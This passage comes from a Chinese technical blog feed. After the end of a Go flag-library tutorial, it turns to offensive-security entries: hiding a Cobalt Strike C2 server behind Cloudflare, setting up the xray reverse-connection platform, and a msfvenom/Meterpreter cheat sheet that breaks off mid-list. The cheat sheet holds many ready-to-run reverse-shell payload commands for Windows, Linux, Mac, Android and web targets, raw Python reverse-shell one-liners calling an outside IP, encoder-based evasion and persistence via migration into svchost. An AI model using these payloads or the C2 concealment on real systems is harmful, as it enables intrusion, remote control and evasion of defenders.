operator">*</span>intflag<span class="token punctuation">)</span>  fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"bool flag:"</span><span class="token punctuation">,</span> <span class="token operator">*</span>boolflag<span class="token punctuation">)</span>  fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"string flag:"</span><span class="token punctuation">,</span> <span class="token operator">*</span>stringflag<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5-高级用法"><a href="#5-高级用法" class="headerlink" title="5 高级用法"></a>5 高级用法</h2><h3 id="5-1-定义短选项"><a href="#5-1-定义短选项" class="headerlink" title="5.1 定义短选项"></a>5.1 定义短选项</h3><p>flag库并没有显示支持短选项，但是可以通过给某个相同的变量设置不同的选项来实现。即两个选项共享同一个变量。 由于初始化顺序不确定，必须保证它们拥有相同的默认值。否则不传该选项时，行为是不确定的</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>  <span class="token string">"fmt"</span>  <span class="token string">"flag"</span><span class="token punctuation">)</span><span class="token keyword">var</span> logLevel <span class="token builtin">string</span><span class="token keyword">func</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> <span class="token punctuation">(</span>    defaultLogLevel <span class="token operator">=</span> <span class="token string">"DEBUG"</span>    usage <span class="token operator">=</span> <span class="token string">"set log level value"</span>  <span class="token punctuation">)</span>    flag<span class="token punctuation">.</span><span class="token function">StringVar</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>logLevel<span class="token punctuation">,</span> <span class="token string">"log_type"</span><span class="token punctuation">,</span> defaultLogLevel<span class="token punctuation">,</span> usage<span class="token punctuation">)</span>  flag<span class="token punctuation">.</span><span class="token function">StringVar</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>logLevel<span class="token punctuation">,</span> <span class="token string">"l"</span><span class="token punctuation">,</span> defaultLogLevel<span class="token punctuation">,</span> usage <span class="token operator">+</span> <span class="token string">"(shorthand)"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  flag<span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"log level:"</span><span class="token punctuation">,</span> logLevel<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-2-解析时间间隔"><a href="#5-2-解析时间间隔" class="headerlink" title="5.2 解析时间间隔"></a>5.2 解析时间间隔</h3><p>除了能使用基本类型作为选项，flag库还支持time.Duration类型，即时间间隔。时间间隔支持的格式非常之多，例如”300ms”、”-1.5h”、“2h45m”等等等等。 时间单位可以是 ns/us/ms/s/m/h/day 等。实际上flag内部会调用time.ParseDuration。具体支持的格式可以参见time（需fq）库的文档。</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>  <span class="token string">"flag"</span>  <span class="token string">"fmt"</span>  <span class="token string">"time"</span><span class="token punctuation">)</span><span class="token keyword">var</span> <span class="token punctuation">(</span>  period time<span class="token punctuation">.</span>Duration<span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  flag<span class="token punctuation">.</span><span class="token function">DurationVar</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>period<span class="token punctuation">,</span> <span class="token string">"period"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token operator">*</span>time<span class="token punctuation">.</span>Second<span class="token punctuation">,</span> <span class="token string">"sleep period"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  flag<span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"Sleeping for %v..."</span><span class="token punctuation">,</span> period<span class="token punctuation">)</span>  time<span class="token punctuation">.</span><span class="token function">Sleep</span><span class="token punctuation">(</span>period<span class="token punctuation">)</span>  fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Go语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域名/DNS 配置</title>
      <link href="2021/05/27/yu-ming-dns-pei-zhi/"/>
      <url>2021/05/27/yu-ming-dns-pei-zhi/</url>
      
        <content type="html"><![CDATA[<h1 id="域名-DNS-相关配置"><a href="#域名-DNS-相关配置" class="headerlink" title="域名/DNS 相关配置"></a>域名/DNS 相关配置</h1><span id="more"></span><h2 id="1-域名-DNS配置"><a href="#1-域名-DNS配置" class="headerlink" title="1 域名/DNS配置"></a>1 域名/DNS配置</h2><h3 id="1-1注册google-邮箱"><a href="#1-1注册google-邮箱" class="headerlink" title="1.1注册google 邮箱"></a>1.1注册google 邮箱</h3><p>需要提前注册好，这里不做过多描述</p><h3 id="1-2注册免费域名"><a href="#1-2注册免费域名" class="headerlink" title="1.2注册免费域名"></a>1.2注册免费域名</h3><p>地址：<a href="https://my.freenom.com/">https://my.freenom.com/</a></p><p>下图几个域名后缀为免费域名</p><img src="/2021/05/27/yu-ming-dns-pei-zhi/img-1.png" class="slug"><p>这里需要先把vpn改到全局代理，然后注册域名，注册完以后需要先修改用户信息，再去付款，最高可以选择一年，然后去goole邮箱激活</p><h3 id="1-3注册登录免费CDN"><a href="#1-3注册登录免费CDN" class="headerlink" title="1.3注册登录免费CDN"></a>1.3注册登录免费CDN</h3><p>地址：<a href="https://dash.cloudflare.com/">https://dash.cloudflare.com/</a></p><img src="/2021/05/27/yu-ming-dns-pei-zhi/img-2.png" class="slug"><p>注册完后，输入子域名</p><img src="/2021/05/27/yu-ming-dns-pei-zhi/img-3.png" class="slug"><p>将ns地址填入</p><img src="/2021/05/27/yu-ming-dns-pei-zhi/img-4.png" class="slug"><p>即可</p><p>参考：<a href="https://mp.weixin.qq.com/s/S_REwcYlJGpyiJb3PIwsOQ">https://mp.weixin.qq.com/s/S_REwcYlJGpyiJb3PIwsOQ</a></p><p><a href="https://zhujitips.com/328">https://zhujitips.com/328</a></p><h2 id="2-C2服务器隐藏"><a href="#2-C2服务器隐藏" class="headerlink" title="2 C2服务器隐藏"></a>2 C2服务器隐藏</h2><p>链接cs服务端，在这之后新建一个监听器为 http 的，然后 Hosts 和 Beacons 都设置为域名：</p><img src="/2021/05/27/yu-ming-dns-pei-zhi/img-5.png" class="slug"><p>注意 http port 端口只能设置成以下几个：</p><pre class="line-numbers language-none"><code class="language-none">80,8080,8880,2052,2082,2086,2095<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果是 https 的监听端口只能设置成以下几个：</p><pre class="line-numbers language-none"><code class="language-none">443,2053,2083,2087,2096,8443;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>因为这是 Cloudflare 仅支持的端口，所以没办法把监听器设置成其他端口。</p><p>尝试上线</p><img src="/2021/05/27/yu-ming-dns-pei-zhi/img-6.png" class="slug">]]></content>
      
      
      
        <tags>
            
            <tag> 配置 </tag>
            
            <tag> 服务器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xray 反连平台搭建</title>
      <link href="2021/05/20/xray-fan-lian-ping-tai-da-jian/"/>
      <url>2021/05/20/xray-fan-lian-ping-tai-da-jian/</url>
      
        <content type="html"><![CDATA[<h1 id="Xray-反连平台搭建"><a href="#Xray-反连平台搭建" class="headerlink" title="Xray 反连平台搭建"></a>Xray 反连平台搭建</h1><span id="more"></span><h2 id="1-简单介绍"><a href="#1-简单介绍" class="headerlink" title="1. 简单介绍"></a>1. 简单介绍</h2><p>xray是一款功能强大的安全评估工具,支持常见web漏洞的自动化检测,可以在 Github兔费下载使用(不开源)</p><h2 id="2-下载"><a href="#2-下载" class="headerlink" title="2. 下载"></a>2. 下载</h2><p><a href=https://download.xray.cool/>国内下载_地址</a></p><p><a href=https://github.com/chaitin/xray>github地址</a></p><p><a href=https://docs.xray.cool/#/tutorial/prepare>使用手册</a></p><p>其他功能和特点暂不做介绍，本文仅阐述反连平台搭建</p><h2 id="3-反连平台搭建"><a href="#3-反连平台搭建" class="headerlink" title="3. 反连平台搭建"></a>3. 反连平台搭建</h2><h3 id="3-1-准备"><a href="#3-1-准备" class="headerlink" title="3.1 准备"></a>3.1 准备</h3><p>可自定义DNS host的域名 \n</p><p>一台VPS</p><h3 id="3-2-VPS-配置"><a href="#3-2-VPS-配置" class="headerlink" title="3.2 VPS 配置"></a>3.2 VPS 配置</h3><p>开放UDP 53 端口 （此处必须为UDP协议，默认为TCP协议，注意避坑）<br>开放TCP 10001 端口 </p><h3 id="3-3-域名解析配置"><a href="#3-3-域名解析配置" class="headerlink" title="3.3 域名解析配置"></a>3.3 域名解析配置</h3><p>增加ns1/ns2 解析到VPS</p><img src="/2021/05/20/xray-fan-lian-ping-tai-da-jian/img.png" class="slug"><h3 id="3-4-Xray-server-配置"><a href="#3-4-Xray-server-配置" class="headerlink" title="3.4 Xray-server 配置"></a>3.4 Xray-server 配置</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">reverse:  db_file_path: &quot;reverse.db&quot;   # 反连平台数据库文件位置, 这是一个 KV 数据库  token: &quot;你的密码&quot; # 反连平台认证的 Token, 独立部署时不能为空  http:    enabled: true    listen_ip: 0.0.0.0     listen_port: &quot;10001&quot;    ip_header: &quot;&quot;                         dns:    enabled: true    listen_ip: 0.0.0.0     domain: &quot;example.com&quot;  # DNS 域名配置    is_domain_name_server: false        resolve:                            # DNS 静态解析规则    - type: A                           # A, AAAA, TXT 三种      record: ns1      value: xxx.xx.xx.xx      ttl: 60    - type: A                           # A, AAAA, TXT 三种      record: ns2      value: xxx.xxx.xxx.xxx      ttl: 60      <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-测试"><a href="#4-测试" class="headerlink" title="4. 测试"></a>4. 测试</h2><p>登录VPS</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">.&#x2F;xray_linux_amd64 reverse  #启动<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>访问listen_port对应端口<br><img src="img_1.png" alt="img_1.png"><br>输入token信息认证，参照使用说明进行验证<br>如下图，获取了当前用户的whoami信息<br><img src="img_2.png" alt="img_2.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Msfvenmon常用命令/Meterpreter后渗透常用命令</title>
      <link href="2021/05/01/msfvenmon-chang-yong-ming-ling-meterpreter-hou-shen-tou-chang-yong-ming-ling/"/>
      <url>2021/05/01/msfvenmon-chang-yong-ming-ling-meterpreter-hou-shen-tou-chang-yong-ming-ling/</url>
      
        <content type="html"><![CDATA[<h1 id="Meterpreter后渗透常用命令"><a href="#Meterpreter后渗透常用命令" class="headerlink" title="Meterpreter后渗透常用命令"></a>Meterpreter后渗透常用命令</h1><span id="more"></span><h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1 前言"></a>1 前言</h2><p>Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个Meterpreter shell的链接。Meterpreter shell作为渗透模块有很多有用的功能，比如添加一个用户、隐藏一些东西、打开shell、得到用户密码、上传下载远程主机的文件、运行cmd.exe、捕捉屏幕、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息、显示远程机器的网络接口和IP地址等信息。另外Meterpreter能够躲避入侵检测系统，在远程主机上隐藏自己，它不改变系统硬盘中的文件，因此HIDS[基于主机的入侵检测系统]很难对它做出响应。此外它在运行的时候系统时间是变化的，所以跟踪它或者终止它对于一个有经验的人也会变得非常困难</p><h2 id="2-文件目录解析"><a href="#2-文件目录解析" class="headerlink" title="2 文件目录解析"></a>2 文件目录解析</h2><p>核心文件包括data、modules、scripts、tools、plugins</p><h3 id="2-1-data"><a href="#2-1-data" class="headerlink" title="2.1 data"></a>2.1 data</h3><p>该文件常用功能在woldlist 里面</p><h3 id="2-2-modules"><a href="#2-2-modules" class="headerlink" title="2.2 modules"></a>2.2 modules</h3><p>该文件包含了msf最核心的几个文件</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">auxiliary #漏洞辅助模块一般是没有攻击载荷的漏洞攻击Exploit #渗透攻击模块st #开发模块pads #漏洞负载模块Encode #编码模块Nops #空指令模块<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-3-scripts"><a href="#2-3-scripts" class="headerlink" title="2.3 scripts"></a>2.3 scripts</h3><p>该文件夹里面包含各种脚本</p><h3 id="2-4-tools"><a href="#2-4-tools" class="headerlink" title="2.4 tools"></a>2.4 tools</h3><p>该文件夹中存放着大量的使用脚本</p><h3 id="2-5-plugins"><a href="#2-5-plugins" class="headerlink" title="2.5 plugins"></a>2.5 plugins</h3><p>该文件夹放着大量的插件</p><h2 id="3-生成木马模块"><a href="#3-生成木马模块" class="headerlink" title="3 生成木马模块"></a>3 生成木马模块</h2><h3 id="3-1-常用参数"><a href="#3-1-常用参数" class="headerlink" title="3.1 常用参数"></a>3.1 常用参数</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">-p # –payload &lt; payload&gt; 指定需要使用的payload(攻击荷载)。也可以使用自定义payload,几乎是支持全平台的-l # –list [module_type] 列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all -n # –nopsled &lt; length&gt; 为payload预先指定一个NOP滑动长度-f # –format &lt; format&gt; 指定输出格式 (使用 –help-formats 来获取msf支持的输出格式列表)-e, #–encoder [encoder] 指定需要使用的encoder(编码器),指定需要使用的编码，如果既没用-e选项也没用-b选项，则输出raw payload -a # –arch &lt; architecture&gt; 指定payload的目标架构，例如x86 | x64 | x86_64-–platform &lt; platform&gt; 指定payload的目标平台-s #–space &lt; length&gt; 设定有效攻击荷载的最大长度，就是文件大小-b, #–bad-chars &lt; list&gt; 设定规避字符集，指定需要过滤的坏字符例如:不使用 &#39;\x0f&#39;、&#39;\x00&#39;; -i # –iterations &lt; count&gt; 指定payload的编码次数-c #–add-code &lt; path&gt; 指定一个附加的win32 shellcode文件-x #–template &lt; path&gt; 指定一个自定义的可执行文件作为模板,并将payload嵌入其中-k #–keep 保护模板程序的动作，注入的payload作为一个新的进程运行 –payload-options 列举payload的标准选项-o # –out &lt; path&gt; 指定创建好的payload的存放位置-v #–var-name &lt; name&gt; 指定一个自定义的变量，以确定输出格式 –shellest 最小化生成payload-h  # –help 查看帮助选项–help-formats #查看msf支持的输出格式列表# ⽐如想查看 windows&#x2F;meterpreter&#x2F;reverse_tcp 支持什什么平台、哪些选项，可以使⽤ msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp --list- options<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-2-几个重要的监听参数"><a href="#3-2-几个重要的监听参数" class="headerlink" title="3.2 几个重要的监听参数"></a>3.2 几个重要的监听参数</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#防止假session 在实际使用中，会遇到假session 或者刚链接就断开的情况，补充一些参数，防止假死与假session msf exploit(multi&#x2F;handler) &gt; set ExitOnSession false &#x2F;&#x2F;可以在接收到seesion后继续监听端口，保持侦听。#防止session 意外退出msf5 exploit(multi&#x2F;handler) &gt; set SessionCommunicationTimeout 0 &#x2F;&#x2F;默认情况下，如果一个会话将在5分钟(300秒)没有任何活动，那么它会被杀死,为防止此情况可将此项修改为0msf5 exploit(multi&#x2F;handler) &gt; set SessionExpirationTimeout 0 &#x2F;&#x2F;默认情况下，一个星期(604800秒)后，会话将被强制关闭,修改为0可永久不会被关闭<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-3-handler-后台持续监听"><a href="#3-3-handler-后台持续监听" class="headerlink" title="3.3 handler 后台持续监听"></a>3.3 handler 后台持续监听</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msf exploit(multi&#x2F;handler) &gt; exploit -j -z#使⽤用 exploit -j -z 可在后台持续监听,-j为后台任务，-z为成功后不不主动发送stage，使⽤用Jobs命令查看和管理理后台任 务。 jobs -K 可结束所有任务。#快捷建立监听方式msf5 &gt; handler -H 192.177.113.87 -P 4444 -p windows&#x2F;meterpreter&#x2F;reverse_tcp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-4-payload-可持续化"><a href="#3-4-payload-可持续化" class="headerlink" title="3.4 payload 可持续化"></a>3.4 payload 可持续化</h3><p>一般来说使用，msfvenom 生成的payload会单独开启一个进程，这种进程很容易被发现和关闭，在后期想做持久化的时候只能再使用migrate</p><p>通过生成payload时使用如下命令，payload会直接注入指定进程</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.177.113.87 LPORT&#x3D;4444 -e x86&#x2F;shikata_ga_nai -b &quot;\x00&quot; -i 5 -a x86 --platform win PrependMigrate&#x3D;ture PrependMigrateProc&#x3D;svchost.exe -f exe -o shell.exe #⽣成的shell程序执⾏后会启动两个进程 shell.exe 和 svchost.exe ，关闭其中一个不会影响会话状态。唯一美中不足的是 svchost.exe 不是 system32 目录下的。#1.PrependMigrate&#x3D;true PrependMigrateProc&#x3D;svchost.exe 使这个程序默认会迁移到svchost.exe进程，⾃己测试的时候不不建议到这个进程⽽是其他的持久进程#2.使⽤用-p指定使⽤用的攻击载荷模块，使⽤用-e指定使⽤用x86&#x2F;shikata_ga_nai编码器器，使⽤用-f选项告诉MSF编码器器输出格式为exe，-o选项指定输出的文件名为payload.exe，保存在根目录下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-2-各平台payload-生成"><a href="#3-2-各平台payload-生成" class="headerlink" title="3.2 各平台payload 生成"></a>3.2 各平台payload 生成</h3><h4 id="3-2-1-windows"><a href="#3-2-1-windows" class="headerlink" title="3.2.1 windows"></a>3.2.1 windows</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.177.113.87 LPORT&#x3D;4444 -a x86 --platform Windows -f exe &gt;shell.exemsfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.177.113.87 LPORT&#x3D;4444 -f exe &gt;shell.exe#注意：windows下⽣生成32位&#x2F;64位payload时需要注意:以windows&#x2F;meterpreter&#x2F;reverse_tcp为例例，该payload默认为32位，也可使⽤-a x86选项指定。如果要生成64位，则payload为windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-2-2-Linux"><a href="#3-2-2-Linux" class="headerlink" title="3.2.2 Linux"></a>3.2.2 Linux</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.177.113.87 LPORT&#x3D;4444 -a x86 --platform Linux -f elf &gt;shell.elf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-2-3-Mac"><a href="#3-2-3-Mac" class="headerlink" title="3.2.3 Mac"></a>3.2.3 Mac</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p osx&#x2F;x86&#x2F;shell_reverse_tcp LHOST&#x3D;192.177.113.87 LPORT&#x3D;4444 -f -a x86 --platform osx -f macho &gt;shell.macho<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-2-4-Android"><a href="#3-2-4-Android" class="headerlink" title="3.2.4 Android"></a>3.2.4 Android</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -a dalvik -p android&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.177.113.87 LPORT&#x3D;4444 -f raw &gt;shell.apkmsfvenom -p android&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.177.113.87 R&gt;shell.apk<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="3-2-5-Powershell"><a href="#3-2-5-Powershell" class="headerlink" title="3.2.5 Powershell"></a>3.2.5 Powershell</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -a x86 -platform windows -p windows&#x2F;poweshell_reverse_tcp LHOST&#x3D;192.177.113.87 LPORT&#x3D;4444 -e cmd&#x2F;powershell_base -f raw -o shell.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-2-6-Netcat"><a href="#3-2-6-Netcat" class="headerlink" title="3.2.6 Netcat"></a>3.2.6 Netcat</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#nc 正向链接msfvenom -p windows&#x2F;shell_hidden_bind_tcp LHOST&#x3D;192.177.113.87 LPORT&#x3D;4444 -f exe &gt;shell.exe#nc 反向连接msfvenom -p windows&#x2F;shell_reverse_tcp LHOST&#x3D;192.177.113.87 LPORT&#x3D;4444 -f exe &gt;shell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-2-7-基于Linux的shellcode"><a href="#3-2-7-基于Linux的shellcode" class="headerlink" title="3.2.7 基于Linux的shellcode"></a>3.2.7 基于Linux的shellcode</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.177.113.87 LPORT&#x3D;4444 -a x86 --platform linux -f c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-2-8-基于Windows的shellcode"><a href="#3-2-8-基于Windows的shellcode" class="headerlink" title="3.2.8 基于Windows的shellcode"></a>3.2.8 基于Windows的shellcode</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.177.113.87 LPORT&#x3D;4444 -a x86 --platform windows -f c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-2-9-基于MAC的shellcode"><a href="#3-2-9-基于MAC的shellcode" class="headerlink" title="3.2.9 基于MAC的shellcode"></a>3.2.9 基于MAC的shellcode</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvemom -p osx&#x2F;x86&#x2F;shell_reverse_tcp LHOST&#x3D;192.177.113.87 LPORT&#x3D;4444 -a x86 --platform osx -f c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-2-10-Python-反弹shell"><a href="#3-2-10-Python-反弹shell" class="headerlink" title="3.2.10 Python 反弹shell"></a>3.2.10 Python 反弹shell</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p cmd&#x2F;unix&#x2F;reverse_python LHOST&#x3D;192.177.113.87 LPORT&#x3D;4444 -f raw&gt;shell.pymsfvenom -a python -p python&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.177.113.87 LPORT&#x3D;4444 -f raw &gt;shell.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="3-2-11-Python正向shell"><a href="#3-2-11-Python正向shell" class="headerlink" title="3.2.11 Python正向shell"></a>3.2.11 Python正向shell</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#1.python&#x2F;python3 -c python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.177.113.87&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-i&quot;]);&#39;#2.python&#x2F;python3 -c &quot;exec(\&quot;import socket, subprocess;s &#x3D; socket.socket();s.connect((&quot;192.177.113.87&quot;,3333))\n while 1: proc &#x3D; subprocess.Popen(s.recv(1024), shell&#x3D;True, stdout&#x3D;subprocess.PIPE, stderr&#x3D;subprocess.PIPE, stdin&#x3D;subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\&quot;)&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-2-12-Bash"><a href="#3-2-12-Bash" class="headerlink" title="3.2.12 Bash"></a>3.2.12 Bash</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p cmd&#x2F;unix&#x2F;reverse_bash LHOST&#x3D;192.177.113.87 LPORT&#x3D;4444 -f raw &gt; shell.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-2-13-Perl"><a href="#3-2-13-Perl" class="headerlink" title="3.2.13 Perl"></a>3.2.13 Perl</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p cmd&#x2F;unix&#x2F;reverse_perl LHOST&#x3D;192.177.113.87 LPORT&#x3D;4444 -f raw &gt; shell.pl<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-2-14-Lua"><a href="#3-2-14-Lua" class="headerlink" title="3.2.14 Lua"></a>3.2.14 Lua</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p cmd&#x2F;unix&#x2F;reverse_lua LHOST&#x3D;192.177.113.87 LPORT&#x3D;4444 -f raw &gt; shell.lua<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-2-15-Ruby"><a href="#3-2-15-Ruby" class="headerlink" title="3.2.15 Ruby"></a>3.2.15 Ruby</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p ruby&#x2F;shell_reverse_tcp LHOST&#x3D;192.177.113.87 LPORT&#x3D;4444 -f raw &gt; shell.rb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-2-16-Web"><a href="#3-2-16-Web" class="headerlink" title="3.2.16 Web"></a>3.2.16 Web</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#PHPmsfvenom -p php&#x2F;meterpreter_reverse_tcp LHOST&#x3D;10.211.55.2 LPORT&#x3D;3333 -f raw &gt; shell.php cat shell.php | pbcopy &amp;&amp; echo &#39;&lt;?php &#39; | tr -d &#39;\n&#39; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php#ASPXmsfvenom -a x86 --platform windows -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;10.211.55.2 LPORT&#x3D;3333 -f aspx -o shell.aspx#ASPmsfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;10.211.55.2 LPORT&#x3D;3333 -f asp &gt; shell.asp#JSPmsfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;10.211.55.2 LPORT&#x3D;3333 -f raw &gt; shell.jsp#WARmsfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;10.211.55.2 LPORT&#x3D;3333 -f war &gt; shell.war#nodejsmsfvenom -p nodejs&#x2F;shell_reverse_tcp LHOST&#x3D;10.211.55.2 LPORT&#x3D;3333 -f raw -o shell.js<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-系统命令"><a href="#4-系统命令" class="headerlink" title="4 系统命令"></a>4 系统命令</h2><h3 id="4-1-基础系统命令"><a href="#4-1-基础系统命令" class="headerlink" title="4.1 基础系统命令"></a>4.1 基础系统命令</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">search #查找漏洞利用模块use &lt;name&gt; #使用指定模块show options #显示所有配置信息session -s &lt;ID&gt; # 进入会话。- K 杀死会话background  #当前会话放置后台run #执行。run后按下俩下 tab，列出已有脚本info #查看已有模块信息getuid #查看权限getpid 